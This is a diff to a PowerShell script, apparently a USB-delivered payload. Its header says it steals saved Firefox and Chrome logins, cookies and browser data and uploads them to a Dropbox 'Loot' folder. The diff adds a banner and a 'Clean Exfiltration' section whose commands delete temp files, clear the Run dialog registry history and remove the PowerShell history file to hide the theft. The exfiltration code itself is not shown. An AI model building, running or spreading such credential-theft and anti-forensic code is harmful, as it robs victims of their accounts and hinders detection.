@@ -1,4 +1,15 @@
-# This script will grab Firefox and Chrome Saved Logins and Cookies along with Browser Data for Chrome, Edge, Firefox, and Opera then upload those to
+#=====================================================================================================
+#===     =================  =====================  =====  ============================================
+#==  ===  ================  =====================   ===   ============================================
+#=  ======================  =====================  =   =  ========================  ==================
+#=  =========   ====   ===  =  ==  ===   ========  == ==  ===   ===  = ====   ===    ===   ===  =   ==
+#=  ========     ==     ==    =======  =  =======  =====  ==     ==     ==  =  ===  ===  =  ==    =  =
+#=  ========  =  ==  =  ==   ====  ==     =======  =====  ==  =  ==  =  ===  =====  ===     ==  ======
+#=  ========  =  ==  =  ==    ===  ==  ==========  =====  ==  =  ==  =  ====  ====  ===  =====  ======
+#==  ===  ==  =  ==  =  ==  =  ==  ==  =  =======  =====  ==  =  ==  =  ==  =  ===  ===  =  ==  ======
+#===     ====   ====   ===  =  ==  ===   ========  =====  ===   ===  =  ===   ====   ===   ===  ======
+#=====================================================================================================
+#This script will grab Firefox and Chrome Saved Logins and Cookies along with Browser Data for Chrome, Edge, Firefox, and Opera then upload those to
 # DropBox in a new folder called Loot followed by a Folder named after the username the data came from
 #
 # The extraction of Browser History and Bookmarks was copied from I-Am-Jakoby's browserData.ps1 script 
@@ -191,8 +202,10 @@ catch {
 }
 
 #------------------------------------------------------------------------------------------------------------------------------------
-
-
+#
+# Clean Exfiltration - deletes files in tmp directory, deletes run dialog and powershell history, empties recycling bin
+# ^^ Thanks for this I-Am-Jakoby ^^
+#
 rm $env:tmp\* -r -Force -ErrorAction SilentlyContinue
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
 Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
